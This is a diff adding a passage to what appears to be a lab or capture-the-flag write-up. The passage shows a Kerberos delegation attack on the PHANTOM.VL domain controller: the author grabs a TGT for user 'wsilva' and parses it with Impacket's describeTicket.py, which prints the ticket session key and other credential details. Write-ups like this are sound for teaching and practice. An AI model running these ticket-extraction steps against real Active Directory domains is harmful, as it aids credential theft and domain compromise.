@@ -673,5 +673,31 @@ SMB         10.129.234.63   445    DC               [+] Run the following comman
 
 First ill grab a TGT for the user configured for delegation
 
+```python
+describeTicket.py wsilva.ccache 
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Number of credentials in cache: 1
+[*] Parsing credential[0]:
+[*] Ticket Session Key            : 547507c1fd1b1c7312e896f082e209322361fc166d4d51446913a697fe2478ee
+[*] User Name                     : wsilva
+[*] User Realm                    : PHANTOM.VL
+[*] Service Name                  : krbtgt/PHANTOM.VL
+[*] Service Realm                 : PHANTOM.VL
+[*] Start Time                    : 15/08/2026 19:30:29 PM
+[*] End Time                      : 16/08/2026 05:30:29 AM
+[*] RenewTill                     : 16/08/2026 19:30:29 PM
+[*] Flags                         : (0x50e10000) forwardable, proxiable, renewable, initial, pre_authent, enc_pa_rep
+[*] KeyType                       : aes256_cts_hmac_sha1_96
+[*] Base64(key)                   : VHUHwf0bHHMS6JbwguIJMiNh/BZtTVFEaROml/4keO4=
+[*] Decoding unencrypted data in credential[0]['ticket']:
+[*]   Service Name                : krbtgt/PHANTOM.VL
+[*]   Service Realm               : PHANTOM.VL
+[*]   Encryption type             : aes256_cts_hmac_sha1_96 (etype 18)
+[-] Could not find the correct encryption key! Ticket is encrypted with aes256_cts_hmac_sha1_96 (etype 18), but no keys/creds were supplied
+```
+
+Then ill use this impacket script to get the ticket session key
+
 
 
